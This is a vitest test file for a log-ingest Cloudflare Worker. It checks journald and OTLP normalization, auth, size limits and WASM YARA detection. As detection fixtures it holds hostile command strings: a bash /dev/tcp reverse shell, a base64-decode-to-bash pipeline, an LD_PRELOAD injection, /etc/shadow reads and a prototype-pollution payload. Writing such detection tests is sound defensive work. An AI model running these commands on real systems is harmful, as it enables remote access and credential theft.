import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { describe, expect, it } from "vitest";
import type { TelemetryLogRecord } from "../src/normalize";
import defaultHandler, { createIngestHandler, IngestEnv } from "../src/index";
import { WasmYaraDetector } from "../src/yara";

const workerDir = resolve(import.meta.dirname, "..");
const repoRoot = resolve(workerDir, "../../..");

const wasmBytes = readFileSync(resolve(workerDir, "src/wasm/oof_yara_wasm.wasm"));
const wasmModule = new WebAssembly.Module(wasmBytes);
const workerRuleSource = readFileSync(
  resolve(workerDir, "src/rules/linux_journal_core.yar"),
  "utf8",
);
const canonicalRuleSource = readFileSync(
  resolve(repoRoot, "rules/yara/linux_journal_core.yar"),
  "utf8",
);

const VALID_BASIN_FIELD_TYPES = new Set([
  "bool",
  "int32",
  "int64",
  "uint32",
  "uint64",
  "float32",
  "float64",
  "decimal128",
  "string",
  "timestamp",
  "json",
  "bytes",
  "list",
  "struct",
]);

interface BasinField {
  name: string;
  type: "string" | "int32" | "int64" | "bool" | "list";
  required: boolean;
  items?: { type: string };
}

interface BasinSchema {
  fields: BasinField[];
}

const basinSchema = JSON.parse(
  readFileSync(resolve(repoRoot, "contracts/schemas/journal-logs.basin.json"), "utf8"),
) as BasinSchema;

function assertMatchesBasinSchema(record: TelemetryLogRecord): void {
  expect(basinSchema.fields).toHaveLength(24);
  const schemaNames = basinSchema.fields.map((f) => f.name).sort();
  expect(Object.keys(record).sort()).toEqual(schemaNames);

  const rec = record as unknown as Record<string, unknown>;
  for (const field of basinSchema.fields) {
    expect(
      VALID_BASIN_FIELD_TYPES.has(field.type),
      `field ${field.name} has invalid Basin schema type '${String(field.type)}'`,
    ).toBe(true);
    const val = rec[field.name];
    if (field.required) {
      expect(val, `required field ${field.name} must not be null/undefined`).not.toBeNull();
      expect(val, `required field ${field.name} must not be undefined`).not.toBeUndefined();
    } else if (val === null) {
      continue;
    }

    switch (field.type) {
      case "string":
        expect(typeof val, `${field.name} should be string`).toBe("string");
        break;
      case "bool":
        expect(typeof val, `${field.name} should be boolean`).toBe("boolean");
        break;
      case "int32":
        expect(typeof val, `${field.name} should be int32 number`).toBe("number");
        expect(Number.isInteger(val)).toBe(true);
        expect(val as number).toBeGreaterThanOrEqual(-2147483648);
        expect(val as number).toBeLessThanOrEqual(2147483647);
        break;
      case "int64":
        expect(typeof val, `${field.name} should be safe int64 number`).toBe("number");
        expect(Number.isSafeInteger(val)).toBe(true);
        break;
      case "list":
        expect(Array.isArray(val), `${field.name} should be array`).toBe(true);
        if (field.items?.type === "string") {
          for (const item of val as unknown[]) {
            expect(typeof item).toBe("string");
          }
        }
        break;
    }
  }
}

function makeTestHarness(overrides: Partial<IngestEnv> = {}) {
  const sentBatches: TelemetryLogRecord[][] = [];
  const env: IngestEnv = {
    INGEST_AUTH_TOKEN: "test-secret-token-12345",
    TELEMETRY_STREAM: {
      async send(records: TelemetryLogRecord[]) {
        sentBatches.push(records);
      },
    },
    ...overrides,
  };
  const handler = createIngestHandler({
    wasmModule,
    ruleSource: workerRuleSource,
  });
  return { handler, env, sentBatches };
}

async function gzipBytes(input: Uint8Array): Promise<Uint8Array> {
  const stream = new Blob([Buffer.from(input)])
    .stream()
    .pipeThrough(new CompressionStream("gzip") as unknown as TransformStream<Uint8Array, Uint8Array>);
  return new Uint8Array(await new Response(stream).arrayBuffer());
}

describe("Cloudflare Worker Basin Ingest + WASM YARA", () => {
  it("keeps worker rule bundle synchronized with canonical rules/yara", () => {
    expect(workerRuleSource).toBe(canonicalRuleSource);
  });

  it("works via default Worker export with static .wasm and .yar imports", async () => {
    const sent: TelemetryLogRecord[][] = [];
    const env: IngestEnv = {
      INGEST_AUTH_TOKEN: "test-secret-token-12345",
      TELEMETRY_STREAM: {
        async send(records) {
          sent.push(records);
        },
      },
    };
    const res = await defaultHandler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: { authorization: "Bearer test-secret-token-12345" },
        body: JSON.stringify({ host: "default-export-host", message: "bash -i >& /dev/tcp/10.0.0.1/4444" }),
      }),
      env,
    );
    expect(res.status).toBe(202);
    expect(await res.json()).toEqual({ accepted: 1, matched: 1 });
    expect(sent[0]![0]!.yara_rules).toContain("Linux_Reverse_Shell_Indicator");
  });

  it("responds ok on GET /healthz", async () => {
    const { handler, env } = makeTestHarness();
    const res = await handler.fetch(new Request("https://ingest.example/healthz"), env);
    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({ status: "ok", detector: "yara-wasm" });
  });

  it("normalizes raw systemd-journald JSON with byte-array MESSAGE and detects reverse shell", async () => {
    const { handler, env, sentBatches } = makeTestHarness();
    const rawMsgBytes = Array.from(
      new Uint8Array([0xff, 0xfe, ...Buffer.from("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "utf8")]),
    );
    const realtimeUs = "1731643200123456";
    const expectedIso = new Date(Number(BigInt(realtimeUs) / 1000n)).toISOString();

    const req = new Request("https://ingest.example/v1/logs", {
      method: "POST",
      headers: {
        authorization: "Bearer test-secret-token-12345",
        "content-type": "application/json",
      },
      body: JSON.stringify({
        __CURSOR: "s=abc;i=1",
        __REALTIME_TIMESTAMP: realtimeUs,
        _HOSTNAME: "prod-web-01",
        _SYSTEMD_UNIT: "bash.service",
        SYSLOG_IDENTIFIER: "bash",
        _TRANSPORT: "stdout",
        PRIORITY: "3",
        _PID: "4242",
        _UID: "1000",
        _COMM: "bash",
        _EXE: "/bin/bash",
        _CMDLINE: "bash -c id",
        _BOOT_ID: "boot-1",
        _MACHINE_ID: "mach-1",
        TRACE_ID: "4bf92f3577b34da6a3ce929d0e0e4736",
        SPAN_ID: "00f067aa0ba902b7",
        MESSAGE: rawMsgBytes,
      }),
    });

    const res = await handler.fetch(req, env);
    expect(res.status).toBe(202);
    expect(await res.json()).toEqual({ accepted: 1, matched: 1 });
    expect(sentBatches).toHaveLength(1);

    const record = sentBatches[0]![0]!;
    assertMatchesBasinSchema(record);
    expect(record.event_id).toBe("s=abc;i=1");
    expect(record.event_time).toBe(expectedIso);
    expect(record.host).toBe("prod-web-01");
    expect(record.service_name).toBe("bash.service");
    expect(record.priority).toBe(3);
    expect(record.severity).toBe("ERR");
    expect(record.pid).toBe(4242);
    expect(record.uid).toBe(1000);
    expect(record.trace_id).toBe("4bf92f3577b34da6a3ce929d0e0e4736");
    expect(record.span_id).toBe("00f067aa0ba902b7");
    expect(record.yara_matched).toBe(true);
    expect(record.yara_rules).toContain("Linux_Reverse_Shell_Indicator");
    expect(record.yara_tags).toContain("reverse_shell");
  });

  it("processes Vector NDJSON batches, merges host-agent YARA hits, and preserves benign logs", async () => {
    const { handler, env, sentBatches } = makeTestHarness();
    const ndjson = [
      JSON.stringify({
        host: "app-node-02",
        service_name: "nginx.service",
        systemd_unit: "nginx.service",
        priority: 6,
        message: "GET /healthz 200 OK",
      }),
      JSON.stringify({
        host: "app-node-02",
        systemd_unit: "cron.service",
        priority: 4,
        cmdline: "echo aGVsbG8td29ybGQtcGF5bG9hZA== | base64 -d | bash",
        message: "cron job executed command",
      }),
      JSON.stringify({
        host: "app-node-02",
        systemd_unit: "custom-agent.service",
        priority: 2,
        message: "LD_PRELOAD=/tmp/evil.so /usr/bin/id",
        yara_rules: ["Host_Kunai_Preload"],
        yara_tags: ["kunai"],
      }),
    ].join("\n");

    const req = new Request("https://ingest.example/v1/logs", {
      method: "POST",
      headers: { authorization: "Bearer test-secret-token-12345" },
      body: ndjson,
    });

    const res = await handler.fetch(req, env);
    expect(res.status).toBe(202);
    expect(await res.json()).toEqual({ accepted: 3, matched: 2 });

    const records = sentBatches[0]!;
    expect(records).toHaveLength(3);
    for (const rec of records) {
      assertMatchesBasinSchema(rec);
    }

    expect(records[0]!.yara_matched).toBe(false);
    expect(records[0]!.yara_rules).toEqual([]);
    expect(records[1]!.yara_matched).toBe(true);
    expect(records[1]!.yara_rules).toEqual(["Linux_Encoded_Command_Execution"]);
    expect(records[2]!.yara_matched).toBe(true);
    expect(records[2]!.yara_rules).toEqual([
      "Host_Kunai_Preload",
      "Linux_Suspicious_Runtime_Injection",
    ]);
    expect(records[2]!.yara_tags).toContain("kunai");
    expect(records[2]!.yara_tags).toContain("privilege_escalation");
  });

  it("evaluates external YARA symbols passed from journald metadata", async () => {
    const customRule = `
rule SSHD_Brute_Force : auth {
  strings:
    $msg = "Failed password"
  condition:
    systemd_unit == "sshd.service" and priority <= 4 and $msg
}
`;
    const { handler, env, sentBatches } = makeTestHarness({
      YARA_RULES_TEXT: customRule,
    });

    const req = new Request("https://ingest.example/v1/logs", {
      method: "POST",
      headers: { authorization: "Bearer test-secret-token-12345" },
      body: JSON.stringify([
        { _SYSTEMD_UNIT: "sshd.service", PRIORITY: "4", MESSAGE: "Failed password for admin" },
        { _SYSTEMD_UNIT: "app.service", PRIORITY: "4", MESSAGE: "Failed password for admin" },
      ]),
    });

    const res = await handler.fetch(req, env);
    expect(res.status).toBe(202);
    expect(await res.json()).toEqual({ accepted: 2, matched: 1 });
    expect(sentBatches[0]![0]!.yara_rules).toEqual(["SSHD_Brute_Force"]);
    expect(sentBatches[0]![1]!.yara_rules).toEqual([]);
  });

  it("handles textual syslog priorities and null message fallback to MESSAGE", async () => {
    const { handler, env, sentBatches } = makeTestHarness();
    const req = new Request("https://ingest.example/v1/logs", {
      method: "POST",
      headers: { authorization: "Bearer test-secret-token-12345" },
      body: JSON.stringify({
        host: "edge-host-1",
        priority: "error",
        message: null,
        MESSAGE: "cat /etc/shadow attempt",
      }),
    });

    const res = await handler.fetch(req, env);
    expect(res.status).toBe(202);
    expect(await res.json()).toEqual({ accepted: 1, matched: 1 });
    const rec = sentBatches[0]![0]!;
    assertMatchesBasinSchema(rec);
    expect(rec.priority).toBe(3);
    expect(rec.severity).toBe("ERR");
    expect(rec.message).toBe("cat /etc/shadow attempt");
    expect(rec.yara_rules).toContain("Linux_Credential_Access_Attempt");
  });

  it("enforces auth, routing, gzip decompression, body size caps, and upstream error propagation", async () => {
    const { handler, env } = makeTestHarness();

    // Missing server token -> 500
    const noConfigRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: { authorization: "Bearer x" },
        body: "{}",
      }),
      { ...env, INGEST_AUTH_TOKEN: "   " },
    );
    expect(noConfigRes.status).toBe(500);

    // Wrong auth -> 401
    const unauthRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: { authorization: "Bearer wrong-token" },
        body: "{}",
      }),
      env,
    );
    expect(unauthRes.status).toBe(401);

    // Wrong route / method
    expect(
      (await handler.fetch(new Request("https://ingest.example/nope"), env)).status,
    ).toBe(404);
    expect(
      (await handler.fetch(new Request("https://ingest.example/v1/logs", { method: "GET" }), env))
        .status,
    ).toBe(405);

    // Invalid / empty payloads -> 400
    for (const badBody of ["", "[]", "[null]", "{not-json", "{\"a\":1}\n[1,2]"]) {
      const badRes = await handler.fetch(
        new Request("https://ingest.example/v1/logs", {
          method: "POST",
          headers: { authorization: "Bearer test-secret-token-12345" },
          body: badBody,
        }),
        env,
      );
      expect(badRes.status, `body ${badBody} should return 400`).toBe(400);
    }

    // Unsupported Content-Encoding -> 415
    const brRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: {
          authorization: "Bearer test-secret-token-12345",
          "content-encoding": "br",
        },
        body: "{}",
      }),
      env,
    );
    expect(brRes.status).toBe(415);

    // Valid gzipped payload -> 202
    const gzValid = await gzipBytes(
      Buffer.from(JSON.stringify({ host: "gz-host", message: "cat /etc/shadow" }), "utf8"),
    );
    const gzRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: {
          authorization: "Bearer test-secret-token-12345",
          "content-encoding": "gzip",
        },
        body: Buffer.from(gzValid),
      }),
      env,
    );
    expect(gzRes.status).toBe(202);
    expect(await gzRes.json()).toEqual({ accepted: 1, matched: 1 });

    // Gzip bomb exceeding 5 MiB uncompressed -> 413
    const hugeJson = JSON.stringify({ host: "gz-bomb", message: "A".repeat(5 * 1024 * 1024 + 1024) });
    const gzBomb = await gzipBytes(Buffer.from(hugeJson, "utf8"));
    const bombRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: {
          authorization: "Bearer test-secret-token-12345",
          "content-encoding": "gzip",
        },
        body: Buffer.from(gzBomb),
      }),
      env,
    );
    expect(bombRes.status).toBe(413);

    // Streamed uncompressed body > 5 MiB without Content-Length -> 413
    const stream = new ReadableStream<Uint8Array>({
      start(controller) {
        const chunk = new Uint8Array(1024 * 1024);
        chunk.fill(0x61);
        for (let i = 0; i < 6; i++) {
          controller.enqueue(chunk);
        }
        controller.close();
      },
    });
    const tooBigRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: { authorization: "Bearer test-secret-token-12345" },
        body: stream,
        // @ts-expect-error Node fetch requires duplex for streaming request bodies
        duplex: "half",
      }),
      env,
    );
    expect(tooBigRes.status).toBe(413);

    // Upstream Basin stream failure -> 502
    const failEnv: IngestEnv = {
      INGEST_AUTH_TOKEN: "test-secret-token-12345",
      TELEMETRY_STREAM: {
        async send() {
          throw new Error("Basin pipeline temporarily unavailable");
        },
      },
    };
    const failRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: { authorization: "Bearer test-secret-token-12345" },
        body: JSON.stringify({ host: "h1", message: "ok" }),
      }),
      failEnv,
    );
    expect(failRes.status).toBe(502);

    // Unsupported OTLP protobuf Content-Type -> 415
    const pbRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: {
          authorization: "Bearer test-secret-token-12345",
          "content-type": "application/x-protobuf",
        },
        body: new Uint8Array([0x0a, 0x00]),
      }),
      env,
    );
    expect(pbRes.status).toBe(415);
  });

  it("ignores prototype property keys in priority and attributes_json without leaking or polluting", async () => {
    const { handler, env, sentBatches } = makeTestHarness();
    const res = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: {
          authorization: "Bearer test-secret-token-12345",
          "content-type": "application/json",
        },
        body: JSON.stringify([
          {
            host: "proto-host",
            priority: "constructor",
            message: "benign constructor priority",
          },
          {
            host: "proto-host",
            priority: "__proto__",
            message: "benign __proto__ priority",
          },
          {
            host: "proto-host",
            priority: "toString",
            message: "benign toString priority",
            attributes_json: '{"__proto__":{"polluted":1},"extra":"val"}',
          },
        ]),
      }),
      env,
    );

    expect(res.status).toBe(202);
    expect(await res.json()).toEqual({ accepted: 3, matched: 0 });
    expect(({} as { polluted?: unknown }).polluted).toBeUndefined();

    const batch = sentBatches[0]!;
    expect(batch).toHaveLength(3);
    for (const rec of batch) {
      assertMatchesBasinSchema(rec);
      expect(rec.priority).toBe(6);
      expect(rec.severity).toBe("INFO");
    }
    expect(JSON.parse(batch[2]!.attributes_json!)).toMatchObject({ extra: "val" });
  });

  it("unpacks OTLP/HTTP JSON resourceLogs batches, detects YARA matches, and rejects empty OTLP batches", async () => {
    const { handler, env, sentBatches } = makeTestHarness();
    const binaryAlertB64 = Buffer.from(
      new Uint8Array([0xff, 0xfe, ...Buffer.from("bash -i >& /dev/tcp/10.0.0.1/4444", "utf8")]),
    ).toString("base64");

    const otlpPayload = {
      resourceLogs: [
        {
          resource: {
            attributes: [
              { key: "host.name", value: { stringValue: "otel-edge-01" } },
              { key: "service.name", value: { stringValue: "unknown_service:otelcol" } },
              { key: "host.id", value: { stringValue: "machine-xyz" } },
              { key: "host.boot_id", value: { stringValue: "boot-xyz" } },
              { key: "deployment.environment", value: { stringValue: "prod" } },
            ],
          },
          scopeLogs: [
            {
              scope: { name: "journald-receiver" },
              logRecords: [
                {
                  timeUnixNano: "1731643200123000000",
                  observedTimeUnixNano: "1731643201000000000",
                  severityNumber: 17,
                  severityText: "Error",
                  body: { stringValue: "cat /etc/shadow attempt" },
                  traceId: "4bf92f3577b34da6a3ce929d0e0e4736",
                  spanId: "00f067aa0ba902b7",
                  attributes: [
                    { key: "systemd.unit", value: { stringValue: "audit.service" } },
                    { key: "process.pid", value: { intValue: "8812" } },
                    { key: "user.id", value: { intValue: 0 } },
                    { key: "custom.note", value: { stringValue: "shadow-check" } },
                  ],
                },
                {
                  timeUnixNano: "1731643202000000000",
                  severityNumber: 21,
                  body: { bytesValue: binaryAlertB64 },
                  traceId: "00000000000000000000000000000000",
                  spanId: "0000000000000000",
                  attributes: [
                    { key: "syslog.identifier", value: { stringValue: "sh" } },
                  ],
                },
                {
                  timeUnixNano: "0",
                  body: {
                    kvlistValue: {
                      values: [
                        { key: "MESSAGE", value: { stringValue: "GET /readyz 200 OK" } },
                        { key: "PRIORITY", value: { stringValue: "5" } },
                        { key: "_COMM", value: { stringValue: "healthcheck" } },
                      ],
                    },
                  },
                },
              ],
            },
          ],
        },
      ],
    };

    const res = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: {
          authorization: "Bearer test-secret-token-12345",
          "content-type": "application/json",
        },
        body: JSON.stringify(otlpPayload),
      }),
      env,
    );

    expect(res.status).toBe(202);
    expect(await res.json()).toEqual({ accepted: 3, matched: 2 });

    const records = sentBatches[0]!;
    expect(records).toHaveLength(3);
    for (const rec of records) {
      assertMatchesBasinSchema(rec);
    }

    expect(records[0]!.host).toBe("otel-edge-01");
    expect(records[0]!.service_name).toBe("audit.service");
    expect(records[0]!.priority).toBe(3);
    expect(records[0]!.severity).toBe("ERR");
    expect(records[0]!.pid).toBe(8812);
    expect(records[0]!.uid).toBe(0);
    expect(records[0]!.machine_id).toBe("machine-xyz");
    expect(records[0]!.boot_id).toBe("boot-xyz");
    expect(records[0]!.trace_id).toBe("4bf92f3577b34da6a3ce929d0e0e4736");
    expect(records[0]!.span_id).toBe("00f067aa0ba902b7");
    expect(records[0]!.event_time).toBe("2024-11-15T04:00:00.123Z");
    expect(records[0]!.observed_at).toBe("2024-11-15T04:00:01.000Z");
    expect(records[0]!.yara_matched).toBe(true);
    expect(records[0]!.yara_rules).toContain("Linux_Credential_Access_Attempt");
    expect(JSON.parse(records[0]!.attributes_json!)).toMatchObject({
      "deployment.environment": "prod",
      "custom.note": "shadow-check",
      "otel.scope.name": "journald-receiver",
    });

    expect(records[1]!.service_name).toBe("sh");
    expect(records[1]!.priority).toBe(2);
    expect(records[1]!.trace_id).toBeNull();
    expect(records[1]!.span_id).toBeNull();
    expect(records[1]!.yara_matched).toBe(true);
    expect(records[1]!.yara_rules).toContain("Linux_Reverse_Shell_Indicator");

    expect(records[2]!.host).toBe("otel-edge-01");
    expect(records[2]!.service_name).toBe("healthcheck");
    expect(records[2]!.priority).toBe(5);
    expect(records[2]!.severity).toBe("NOTICE");
    expect(records[2]!.message).toBe("GET /readyz 200 OK");
    expect(records[2]!.yara_matched).toBe(false);

    // Empty OTLP resourceLogs / logRecords -> 400
    for (const emptyOtlp of [
      { resourceLogs: [] },
      { resourceLogs: [{ scopeLogs: [{ logRecords: [] }] }] },
    ]) {
      const emptyRes = await handler.fetch(
        new Request("https://ingest.example/v1/logs", {
          method: "POST",
          headers: {
            authorization: "Bearer test-secret-token-12345",
            "content-type": "application/json",
          },
          body: JSON.stringify(emptyOtlp),
        }),
        env,
      );
      expect(emptyRes.status).toBe(400);
    }

    // Malformed OTLP AnyValue variants -> 400 without falling back to NDJSON
    const sentCountBeforeMalformed = sentBatches.length;
    for (const badAnyVal of [
      "cat /etc/shadow",
      123,
      ["x"],
      { unknownField: "x" },
      { stringValue: "a", intValue: 1 },
      { stringValue: { toString: 123 } },
      { boolValue: "yes" },
      { intValue: {} },
      { intValue: "99999999999999999999999999999" },
      { doubleValue: "not-a-double" },
      { doubleValue: "0x10" },
      { bytesValue: "not valid base64!!!" },
      { bytesValue: "abcde" },
      { bytesValue: "abc==" },
      { bytesValue: "+-_/" },
    ]) {
      const badRes = await handler.fetch(
        new Request("https://ingest.example/v1/logs", {
          method: "POST",
          headers: {
            authorization: "Bearer test-secret-token-12345",
            "content-type": "application/json",
          },
          body: JSON.stringify({
            resourceLogs: [{ scopeLogs: [{ logRecords: [{ body: badAnyVal }] }] }],
          }),
        }),
        env,
      );
      expect(badRes.status).toBe(400);
    }
    expect(sentBatches).toHaveLength(sentCountBeforeMalformed);
  });

  it("preserves OTLP attributes_json, honors service precedence, and unpacks host-agent JSON in MESSAGE", async () => {
    const { handler, env, sentBatches } = makeTestHarness();
    const hostFindingJson = JSON.stringify({
      service_name: "host-yara-x",
      priority: 2,
      severity: "CRIT",
      message: "YARA-X host match on /tmp/sample",
      yara_matched: true,
      yara_rules: ["Host_Malware"],
      yara_tags: ["malware"],
      attributes_json: JSON.stringify({ target_path: "/tmp/sample", detector: "host-yara-x" }),
    });

    const payload = {
      resourceLogs: [
        {
          resource: {
            attributes: [
              { key: "host.name", value: { stringValue: "otlp-host-02" } },
              { key: "service.name", value: { stringValue: "real-resource-service" } },
            ],
          },
          scopeLogs: [
            {
              scope: { name: "journald-receiver" },
              logRecords: [
                // Case A + B: logAttr unknown_service falls back to valid resource service.name; attributes_json preserved
                {
                  body: { stringValue: "audit heartbeat" },
                  attributes: [
                    { key: "service.name", value: { stringValue: "unknown_service:logger" } },
                    {
                      key: "attributes_json",
                      value: { stringValue: '{"target_path":"/tmp/sample","agent":"kunai"}' },
                    },
                  ],
                },
                // Case B: service_name inside kvlistValue body overrides scope name, and attributes_json in body preserved
                {
                  body: {
                    kvlistValue: {
                      values: [
                        { key: "message", value: { stringValue: "kvlist service hit" } },
                        { key: "service_name", value: { stringValue: "kv-service" } },
                        {
                          key: "attributes_json",
                          value: { stringValue: '{"source":"kvlist"}' },
                        },
                      ],
                    },
                  },
                  attributes: [
                    { key: "service.name", value: { stringValue: "unknown_service:sidecar" } },
                  ],
                },
                // Case E: journald receiver kvlist MESSAGE containing host-yara-x structured JSON
                {
                  body: {
                    kvlistValue: {
                      values: [
                        { key: "MESSAGE", value: { stringValue: hostFindingJson } },
                        { key: "PRIORITY", value: { stringValue: "2" } },
                      ],
                    },
                  },
                  attributes: [
                    { key: "systemd.unit", value: { stringValue: "host-agent.service" } },
                  ],
                },
                // Case E: stringValue body containing host-yara-x structured JSON
                {
                  body: { stringValue: hostFindingJson },
                  attributes: [
                    { key: "systemd.unit", value: { stringValue: "host-agent.service" } },
                  ],
                },
              ],
            },
          ],
        },
      ],
    };

    // Test record #2 without resource.attributes service.name so kvlist body service_name wins explicitly
    const isolatedKvPayload = {
      resourceLogs: [
        {
          scopeLogs: [
            {
              scope: { name: "journald-receiver" },
              logRecords: [payload.resourceLogs[0]!.scopeLogs[0]!.logRecords[1]],
            },
          ],
        },
      ],
    };
    const kvRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: {
          authorization: "Bearer test-secret-token-12345",
          "content-type": "application/json",
        },
        body: JSON.stringify(isolatedKvPayload),
      }),
      env,
    );
    expect(kvRes.status).toBe(202);
    expect(sentBatches[0]![0]!.service_name).toBe("kv-service");
    expect(JSON.parse(sentBatches[0]![0]!.attributes_json!)).toMatchObject({
      source: "kvlist",
      "otel.scope.name": "journald-receiver",
    });

    // Test batch with unknown_service resource fallback and host-yara-x embedded MESSAGE JSON
    const batchWithoutValidResourceService = {
      resourceLogs: [
        {
          resource: {
            attributes: [
              { key: "host.name", value: { stringValue: "otlp-host-02" } },
              { key: "service.name", value: { stringValue: "unknown_service:otelcol" } },
            ],
          },
          scopeLogs: [
            {
              scope: { name: "journald-receiver" },
              logRecords: [
                payload.resourceLogs[0]!.scopeLogs[0]!.logRecords[2],
                payload.resourceLogs[0]!.scopeLogs[0]!.logRecords[3],
              ],
            },
          ],
        },
      ],
    };
    const hostRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: {
          authorization: "Bearer test-secret-token-12345",
          "content-type": "application/json",
        },
        body: JSON.stringify(batchWithoutValidResourceService),
      }),
      env,
    );
    expect(hostRes.status).toBe(202);
    expect(await hostRes.json()).toEqual({ accepted: 2, matched: 2 });
    for (const rec of sentBatches[1]!) {
      assertMatchesBasinSchema(rec);
      expect(rec.service_name).toBe("host-yara-x");
      expect(rec.priority).toBe(2);
      expect(rec.severity).toBe("CRIT");
      expect(rec.message).toBe("YARA-X host match on /tmp/sample");
      expect(rec.yara_matched).toBe(true);
      expect(rec.yara_rules).toEqual(["Host_Malware"]);
      expect(rec.yara_tags).toEqual(["malware"]);
      expect(JSON.parse(rec.attributes_json!)).toMatchObject({
        target_path: "/tmp/sample",
        detector: "host-yara-x",
      });
    }

    // Test resource.attributes real-resource-service fallback when log attr is unknown_service:logger
    const fallbackRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: {
          authorization: "Bearer test-secret-token-12345",
          "content-type": "application/json",
        },
        body: JSON.stringify({
          resourceLogs: [
            {
              resource: payload.resourceLogs[0]!.resource,
              scopeLogs: [
                {
                  scope: { name: "journald-receiver" },
                  logRecords: [payload.resourceLogs[0]!.scopeLogs[0]!.logRecords[0]],
                },
              ],
            },
          ],
        }),
      }),
      env,
    );
    expect(fallbackRes.status).toBe(202);
    const rec0 = sentBatches[2]![0]!;
    assertMatchesBasinSchema(rec0);
    expect(rec0.service_name).toBe("real-resource-service");
    expect(JSON.parse(rec0.attributes_json!)).toMatchObject({
      target_path: "/tmp/sample",
      agent: "kunai",
      "otel.scope.name": "journald-receiver",
    });
  });

  it("promotes embedded MESSAGE JSON fields, scans shadowed and extra fields, and falls back unknown embedded service aliases", async () => {
    const { handler, env, sentBatches } = makeTestHarness();
    const reverseShellEmbedded = JSON.stringify({
      message: "command completed",
      cmdline: "bash -i >& /dev/tcp/192.0.2.1/4444",
      exe: "/bin/bash",
    });
    const shadowReadEmbedded = JSON.stringify({
      message: "read succeeded",
      target: "/etc/shadow",
    });

    const flatRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: {
          authorization: "Bearer test-secret-token-12345",
          "content-type": "application/json",
        },
        body: JSON.stringify([
          { MESSAGE: reverseShellEmbedded },
          {
            _CMDLINE: "/usr/bin/dockerd",
            _EXE: "/usr/bin/dockerd",
            MESSAGE: reverseShellEmbedded,
          },
          { MESSAGE: shadowReadEmbedded },
        ]),
      }),
      env,
    );
    expect(flatRes.status).toBe(202);
    expect(await flatRes.json()).toEqual({ accepted: 3, matched: 3 });

    const flatBatch = sentBatches[0]!;
    expect(flatBatch).toHaveLength(3);
    for (const rec of flatBatch) {
      assertMatchesBasinSchema(rec);
    }

    // Promoted cmdline/exe detected and exposed in canonical columns
    expect(flatBatch[0]!.message).toBe("command completed");
    expect(flatBatch[0]!.cmdline).toBe("bash -i >& /dev/tcp/192.0.2.1/4444");
    expect(flatBatch[0]!.exe).toBe("/bin/bash");
    expect(flatBatch[0]!.yara_rules).toContain("Linux_Reverse_Shell_Indicator");

    // Outer _CMDLINE/_EXE occupy canonical columns; shadowed embedded values preserved & scanned
    expect(flatBatch[1]!.message).toBe("command completed");
    expect(flatBatch[1]!.cmdline).toBe("/usr/bin/dockerd");
    expect(flatBatch[1]!.exe).toBe("/usr/bin/dockerd");
    expect(flatBatch[1]!.yara_rules).toContain("Linux_Reverse_Shell_Indicator");
    expect(JSON.parse(flatBatch[1]!.attributes_json!)).toMatchObject({
      cmdline: "bash -i >& /dev/tcp/192.0.2.1/4444",
      exe: "/bin/bash",
    });

    // Extra field in embedded MESSAGE preserved in attributes_json and scanned
    expect(flatBatch[2]!.message).toBe("read succeeded");
    expect(flatBatch[2]!.yara_rules).toContain("Linux_Credential_Access_Attempt");
    expect(JSON.parse(flatBatch[2]!.attributes_json!)).toMatchObject({
      target: "/etc/shadow",
    });

    // Embedded unknown_service:* in service_name falls back to valid service.name in same JSON
    const serviceAliasRes = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: {
          authorization: "Bearer test-secret-token-12345",
          "content-type": "application/json",
        },
        body: JSON.stringify({
          resourceLogs: [
            {
              scopeLogs: [
                {
                  scope: { name: "journald-receiver" },
                  logRecords: [
                    {
                      body: {
                        stringValue: JSON.stringify({
                          message: "embedded alias check",
                          service_name: "unknown_service:logger",
                          "service.name": "valid-embedded-service",
                        }),
                      },
                    },
                  ],
                },
              ],
            },
          ],
        }),
      }),
      env,
    );
    expect(serviceAliasRes.status).toBe(202);
    const aliasRec = sentBatches[1]![0]!;
    assertMatchesBasinSchema(aliasRec);
    expect(aliasRec.service_name).toBe("valid-embedded-service");
  });

  it("accepts ProtoJSON unpadded/URL-safe/empty bytesValue and special doubleValue literals", async () => {
    const { handler, env, sentBatches } = makeTestHarness();
    const binaryPayload = Buffer.from(
      new Uint8Array([0xff, 0xfb, ...Buffer.from("bash -i >& /dev/tcp/10.0.0.1/4444", "utf8")]),
    );
    const paddedStdB64 = binaryPayload.toString("base64");
    expect(paddedStdB64.endsWith("=")).toBe(true);
    const unpaddedStdB64 = paddedStdB64.replace(/=+$/, "");
    const urlSafeB64 = binaryPayload.toString("base64url");
    expect(urlSafeB64.includes("_") || urlSafeB64.includes("-")).toBe(true);

    const res = await handler.fetch(
      new Request("https://ingest.example/v1/logs", {
        method: "POST",
        headers: {
          authorization: "Bearer test-secret-token-12345",
          "content-type": "application/json",
        },
        body: JSON.stringify({
          resourceLogs: [
            {
              scopeLogs: [
                {
                  scope: { name: "protojson-test" },
                  logRecords: [
                    {
                      body: { bytesValue: unpaddedStdB64 },
                      attributes: [
                        { key: "metric_nan", value: { doubleValue: "NaN" } },
                        { key: "metric_pos_inf", value: { doubleValue: "Infinity" } },
                      ],
                    },
                    {
                      body: { bytesValue: urlSafeB64 },
                      attributes: [
                        { key: "metric_neg_inf", value: { doubleValue: "-Infinity" } },
                      ],
                    },
